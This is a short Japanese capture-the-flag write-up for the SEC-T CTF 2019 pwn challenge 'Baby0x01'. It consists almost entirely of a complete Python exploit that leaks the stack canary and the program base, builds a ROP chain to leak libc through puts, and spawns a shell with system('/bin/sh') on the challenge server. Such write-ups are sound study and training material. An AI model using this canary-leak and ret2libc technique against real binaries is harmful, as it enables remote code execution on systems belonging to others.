# [pwn 537pts] Baby0x01 - SEC-T CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               1       chall
```
buffer overreadとbuffer overflowがあるのでcanaryやlibc baseをリークしてシェルを呼べば終わりです。
```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./chall")
#sock = Process("./chall")
sock = Socket("baby0x01-01.pwn.beer", 45243)

# leak canary
payload = b"A" * 0x49
sock.sendlineafter(": ", payload)
r = sock.recvline()
canary = u64(b'\x00' + r[-13:-6])
proc_base = u64(r[-6:]) - 3024
logger.info("canary = " + hex(canary))
logger.info("proc base = " + hex(proc_base))

# prepare rop gadget
rop_pop_rdi = proc_base + 0x00000c33
rop_ret = proc_base + 0x0000072e

# prepare rop chain
payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(proc_base + elf.got("puts"))
payload += p64(proc_base + elf.plt("puts"))
payload += p64(proc_base + 0x7d0)
sock.sendlineafter(": ", payload)

# libc leak
sock.sendlineafter("buffer: ", "")
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# get the shell!
payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0)
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
payload += p64(0xffffffffffffffff)
sock.sendlineafter(": ", payload)
sock.sendlineafter("buffer: ", "")

sock.interactive()
```

# 感想
簡単ですね。
